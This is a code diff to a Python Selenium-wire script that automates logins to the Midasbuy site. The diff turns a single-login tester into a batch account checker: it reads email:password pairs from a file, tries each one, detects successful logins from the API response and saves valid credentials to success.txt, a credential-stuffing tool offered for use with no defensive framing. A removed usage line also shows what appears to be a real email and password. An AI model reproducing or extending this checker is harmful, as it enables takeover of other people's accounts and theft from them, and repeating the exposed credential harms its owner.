@@ -1,6 +1,7 @@
 import time
 import json
 import sys
+import os
 import chromedriver_binary
 from seleniumwire import webdriver
 from selenium.webdriver.chrome.options import Options
@@ -19,9 +20,15 @@ def setup_driver():
     driver = webdriver.Chrome(options=chrome_options)
     return driver
 
+def save_success(email, password):
+    with open("success.txt", "a") as f:
+        f.write(f"{email}:{password}\n")
+
 def login_and_intercept(email, password):
     driver = setup_driver()
+    is_success = False
     try:
+        print(f"\n[*] Processing: {email}")
         print(f"[*] Opening Midasbuy login page...")
         driver.get("https://www.midasbuy.com/midasbuy/eg/login#login")
         
@@ -43,7 +50,7 @@ def login_and_intercept(email, password):
         login_button = driver.find_element(By.ID, "loginButton")
 
         # إدخال البيانات
-        print(f"[*] Entering credentials for: {email}")
+        print(f"[*] Entering credentials...")
         email_input.send_keys(email)
         password_input.send_keys(password)
 
@@ -55,18 +62,23 @@ def login_and_intercept(email, password):
         found_request = False
         start_time = time.time()
         
-        while time.time() - start_time < 30:
+        while time.time() - start_time < 20:
             for request in driver.requests:
                 if 'emaillogin' in request.url:
-                    print(f"\n[+] Found 'emaillogin' request!")
-                    print(f"URL: {request.url}")
+                    print(f"[+] Found 'emaillogin' request!")
                     
                     if request.response:
                         print(f"Status Code: {request.response.status_code}")
                         try:
                             from seleniumwire.utils import decode
                             body = decode(request.response.body, request.response.headers.get('Content-Encoding', 'identity'))
-                            print(f"Response Body: {body.decode('utf-8')}")
+                            resp_json = json.loads(body.decode('utf-8'))
+                            if resp_json.get("data", {}).get("ErrorCode") == 0:
+                                print(f"✅ Login SUCCESS: {email}")
+                                save_success(email, password)
+                                is_success = True
+                            else:
+                                print(f"❌ Login FAILED: {email} | Msg: {resp_json.get('msg')}")
                         except Exception as e:
                             print(f"Could not decode response: {e}")
                     
@@ -78,22 +90,35 @@ def login_and_intercept(email, password):
             time.sleep(1)
 
         if not found_request:
-            print("[-] Could not find 'emaillogin' request.")
+            print(f"[-] Could not find 'emaillogin' request for {email}.")
 
     except Exception as e:
-        print(f"[!] An error occurred: {e}")
+        print(f"[!] An error occurred for {email}: {e}")
     finally:
         driver.quit()
+    return is_success
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python3 midas_login.py nomichuzza5@gmail.com:Nouman78600")
+        print("Usage: python3 midas_login_final.py accounts.txt")
         sys.exit(1)
     
-    input_data = sys.argv[1]
-    if ":" not in input_data:
-        print("Error: Input must be in format email:password")
+    file_path = sys.argv[1]
+    if not os.path.exists(file_path):
+        print(f"Error: File {file_path} not found.")
         sys.exit(1)
         
-    email, password = input_data.split(":", 1)
-    login_and_intercept(email, password)
+    with open(file_path, 'r') as f:
+        lines = f.readlines()
+        
+    print(f"[*] Found {len(lines)} accounts in file.")
+    print("[*] Successful logins will be saved to 'success.txt'")
+    
+    for line in lines:
+        line = line.strip()
+        if not line or ":" not in line:
+            continue
+            
+        email, password = line.split(":", 1)
+        login_and_intercept(email, password)
+        print("-" * 30)
